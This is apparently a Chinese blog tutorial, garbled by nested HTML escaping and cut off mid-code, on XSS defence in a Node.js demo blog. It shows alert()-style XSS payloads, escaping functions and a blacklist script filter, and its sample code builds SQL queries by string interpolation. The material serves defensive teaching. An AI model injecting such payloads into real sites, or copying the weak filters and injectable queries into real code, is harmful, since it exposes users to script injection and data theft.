hello&quot;;alert(1);&quot;是输入的内容&lt;/script&gt;&lt;!--hexoPostRenderEscape:&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;53&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    ![image-20200430145451036](web%E5%AE%89%E5%85%A8%E5%89%8D%E5%90%8E%E7%AB%AF&amp;#x2F;image-20200430145451036.png)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    url中输入：&amp;#96;[http:&amp;#x2F;&amp;#x2F;localhost:8090&amp;#x2F;?from&amp;#x3D;google%22;alert(1);%22](http:&amp;#x2F;&amp;#x2F;localhost:8090&amp;#x2F;?from&amp;#x3D;google&amp;quot;;alert(1);&amp;quot;)&amp;#96;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    ![image-20200430145709011](web%E5%AE%89%E5%85%A8%E5%89%8D%E5%90%8E%E7%AB%AF&amp;#x2F;image-20200430145709011.png)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;- 富文本：&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  - 富文本得保留html&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  - HTML有xss攻击风险&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;### **防御**&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;- &amp;#96;浏览器自带防御(X-Xss-Protection)&amp;#96;：参数出现在html内容和属性（但是并非所有的浏览器都是有这种防御能力的）&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;- ![image-20200430150713098](web%E5%AE%89%E5%85%A8%E5%89%8D%E5%90%8E%E7%AB%AF&amp;#x2F;image-20200430150713098.png)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;-  &amp;#96;HTML内容和属性转义&amp;#96;：&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  - &amp;#96;内容转义&amp;#96;&amp;lt; &amp;amp;lt ; 和 &amp;gt;   &amp;amp; gt;   :&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    - 转义的时机可以分为：进入数据数据库之前将其转义，还有就是展示给用户的时候转义&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    - &amp;#96;&amp;#96;&amp;#96;javascript&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;      &amp;#x2F;*        文件：site.js---controllers        *&amp;#x2F;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;      const bluebird &amp;#x3D; require(&amp;#39;bluebird&amp;#39;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;      const connectionModel &amp;#x3D; require(&amp;#39;..&amp;#x2F;models&amp;#x2F;connection&amp;#39;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;      &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;      &amp;#x2F;&amp;#x2F;------------------添加内容：转义字符---------------------------------&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;      var escapeHtml &amp;#x3D; function(str)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;          &amp;#x2F;&amp;#x2F; 需要将下面的from（即网页显示来自哪里的用户）进行转义&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;          str &amp;#x3D; str.replace(&amp;#x2F;&amp;lt;&amp;#x2F;g, &amp;#39;&amp;lt;&amp;#39;); &amp;#x2F;&amp;#x2F;全局替换&amp;lt;为&amp;amp;lt&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;          str &amp;#x3D; str.replace(&amp;#x2F;&amp;gt;&amp;#x2F;g, &amp;#39;&amp;gt;&amp;#39;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;          return str&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;      &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;      &amp;#x2F;&amp;#x2F;---------------------------------------------------------------&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;      &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;      exports.index &amp;#x3D; async function(ctx, next)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;          const connection &amp;#x3D; connectionModel.getConnection();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;          const query &amp;#x3D; bluebird.promisify(connection.query.bind(connection));&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;          const posts &amp;#x3D; await query(&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                  &amp;#39;select post.*,count(comment.id) as commentCount from post left join comment on post.id &amp;#x3D; comment.postId group by post.id limit 10&amp;#39;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;              );&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;          const comments &amp;#x3D; await query(&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                  &amp;#39;select comment.*,post.id as postId,post.title as postTitle,user.username as username from comment left join post on comment.postId &amp;#x3D; post.id left join user on comment.userId &amp;#x3D; user.id order by comment.id desc limit 10&amp;#39;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;              );&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;          &amp;#x2F;&amp;#x2F; ctx.render(&amp;#39;index&amp;#39;, &amp;#123;posts, comments, from:ctx.query.from || &amp;#39;&amp;#39;, avatarId:ctx.query.avatarId || &amp;#39;&amp;#39;&amp;#125;);  &amp;#x2F;&amp;#x2F;这是修改前的&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;          ctx.render(&amp;#39;index&amp;#39;, &amp;#123;posts, comments, from:escapeHtml(ctx.query.from) || &amp;#39;&amp;#39;, avatarId:ctx.query.avatarId || &amp;#39;&amp;#39;&amp;#125;); &amp;#x2F;&amp;#x2F;这是转义后的代码&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;      &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;          connection.end();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;      &amp;#125;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;      &lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;:hexoPostRenderEscape--&gt;</code></pre></li></ul></li></ul><pre><code>- 显示的效果如下![image-20200430152648893](web%E5%AE%89%E5%85%A8%E5%89%8D%E5%90%8E%E7%AB%AF/image-20200430152648893.png)</code></pre><ul><li><p><code>属性转义</code>：转义 “  为&amp;quto；</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;img class&#x3D;&quot;#&#123;class&#125;&quot;&#x2F;&gt;</span><br><span class="line">&lt;img class&#x3D;&quot;hello&quot; onload&#x3D;&quot;alert(1)&quot;&#x2F;&gt;</span><br></pre></td></tr></table></figure><ul><li>转义函数的编写：</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; escapeProperty():转义html属性</span><br><span class="line">&#x2F;&#x2F;Note：所在的文件位置和上面的一样的</span><br><span class="line">var escapeProperty &#x3D; function(str)&#123;</span><br><span class="line">    if(!str) return &#39;&#39;;</span><br><span class="line">    str &#x3D; str.replace(&#x2F;&quot;&#x2F;g, &#39;&amp;quto;&#39;);</span><br><span class="line">    str &#x3D; str.replace(&#x2F;&#39;&#x2F;g, &#39;&#39;&#39;);</span><br><span class="line">    str &#x3D; str.replace(&#x2F; &#x2F;g, &#39;&amp;#32;&#39;);</span><br><span class="line">    return str;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ctx.render(&#39;index&#39;, &#123;posts, comments, from:escapeHtml(ctx.query.from) || &#39;&#39;, avatarId:escapeProperty(ctx.query.avatarId) || &#39;&#39;&#125;); &#x2F;&#x2F;这是转义后的代码</span><br></pre></td></tr></table></figure></li></ul><pre><code>**Note:**双引号、单引号和没有引号都能够引起xss攻击的技巧：将两个函数合并成一个函数，然后使用者一个函数进行转义，这样代码量更少了</code></pre><ul><li><p><code>js转义</code>：转义<code>&quot; \&quot;</code>（即引号转义。因为引号被用户的数据或者数据库中的数据被提前结束了）或者<code>转换成json</code></p><ul><li><pre><code>&lt;script&gt;    var data = &quot;#&#123;content&#125;&quot;;    var data = &quot;hello&quot;;alert(1);&quot;&quot;;                # note:        hello&quot;;alert(1);&quot;是输入的内容&lt;/script&gt;&lt;!--hexoPostRenderEscape:&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;我们将js中from和HTML中的from做一个区分![image-20200430163216035](web%E5%AE%89%E5%85%A8%E5%89%8D%E5%90%8E%E7%AB%AF&amp;#x2F;image-20200430163216035.png)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;:hexoPostRenderEscape--&gt;// escapeProperty():转义html属性var escapeProperty = function(str)&#123;    if(!str) return &#39;&#39;;    str = str.replace(/&quot;/g, &#39;&amp;quto;&#39;);    str = str.replace(/&#39;/g, &#39;&amp;#39;&#39;);    str = str.replace(/ /g, &#39;&amp;#32;&#39;);    return str;&#125;&lt;!--hexoPostRenderEscape:&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;53&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;54&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;55&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    - 更好的做法是&amp;#96;json&amp;#96;做法：    &amp;#96;    fromForJs:JSON.stringify(ctx.query.from),&amp;#96;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;- &amp;#96; 富文本防御&amp;#96;:按白名单保留部分标签和属性，黑名单的话难以预防各种变种，只要不是黑名单中的就可以成功的XSS&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  - 黑名单：在评论处发表如下的内容&amp;#96;&amp;lt;font color&amp;#x3D;\&amp;quot;red\&amp;quot;&amp;gt;这是红色字&amp;lt;&amp;#x2F;br&amp;gt;&amp;lt;script&amp;gt;document.write(&amp;#39;XSS&amp;#39;)&amp;lt;&amp;#x2F;script&amp;gt;&amp;#96;，显示结果如下。前面说过，对于数据的过滤可以是输入的时候也可以是输出的是，而对富文本的的防御一般是输入的时候过滤，因为输入是一个一次性的行为，而过滤的行为比较耗时，影响性能，要是每次输出的时候来进行过滤会造成性能问题的。于是我们对site.js---controllers中的post的comments 做一个过滤&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  - ![image-20200430165937779](web%E5%AE%89%E5%85%A8%E5%89%8D%E5%90%8E%E7%AB%AF&amp;#x2F;image-20200430165937779.png)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  - &amp;#96;&amp;#96;&amp;#96;javascript&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#x2F;&amp;#x2F;黑名单&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    var xssFilter &amp;#x3D; function(html)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        if(!html) return &amp;#39;&amp;#39;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        html &amp;#x3D; html.replace(&amp;#x2F;&amp;lt;\s*\&amp;#x2F;?script\s*&amp;gt;&amp;#x2F;g, &amp;#39;&amp;#39;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        return html;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    exports.post &amp;#x3D; async function(ctx, next)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        try&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            console.log(&amp;#39;enter post&amp;#39;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            const id &amp;#x3D; ctx.params.id;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            const connection &amp;#x3D; connectionModel.getConnection();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            const query &amp;#x3D; bluebird.promisify(connection.query.bind(connection));&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            const posts &amp;#x3D; await query(&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                &amp;#96;select * from post where id &amp;#x3D; &amp;quot;$&amp;#123;id&amp;#125;&amp;quot;&amp;#96;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            );&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            let post &amp;#x3D; posts[0];&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            const comments &amp;#x3D; await query(&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                &amp;#96;select comment.*,user.username from comment left join user on comment.userId &amp;#x3D; user.id where postId &amp;#x3D; &amp;quot;$&amp;#123;post.id&amp;#125;&amp;quot; order by comment.createdAt desc&amp;#96;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            );&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &amp;#x2F;&amp;#x2F;post处增添的内容为----------------------------------------&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            comments.forEach(function(comment)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                 comment.content&amp;#x3D;xssFilter(comment.content);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;           &amp;#125;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;           &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;     &amp;#x2F;&amp;#x2F;-----------------------------------------------------      &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;           &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            if(post)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                ctx.render(&amp;#39;post&amp;#39;, &amp;#123;post, comments&amp;#125;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &amp;#125;else&amp;#123; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                ctx.status &amp;#x3D; 404;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            connection.end();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#125;catch(e)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            console.log(&amp;#39;[&amp;#x2F;site&amp;#x2F;post] error:&amp;#39;, e.message, e.stack);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            ctx.body &amp;#x3D; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                status: e.code || -1,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                body: e.message&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &amp;#125;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;:hexoPostRenderEscape--&gt;此时的效果如下![image-20200430171932110](web%E5%AE%89%E5%85%A8%E5%89%8D%E5%90%8E%E7%AB%AF/image-20200430171932110.png)但是这样并不能解决所有的问题，因为xss变种太多了，例如你发表如下的内容`&lt;a href=\&quot;javascript:alert(1)\&quot;&gt;你好&lt;/a&gt;`和`&lt;img src=\&quot;abc\&quot; onerror=\&quot;alert(123456)\&quot;/&gt;`，其效果分别如下。于是我们又要修改代码![image-20200430172409719](web%E5%AE%89%E5%85%A8%E5%89%8D%E5%90%8E%E7%AB%AF/image-20200430172409719.png)![image-20200430172826994](web%E5%AE%89%E5%85%A8%E5%89%8D%E5%90%8E%E7%AB%AF/image-20200430172826994.png)&lt;!--hexoPostRenderEscape:&lt;figure class=&quot;highlight javascript&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; xssFilter = &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt;(&lt;span 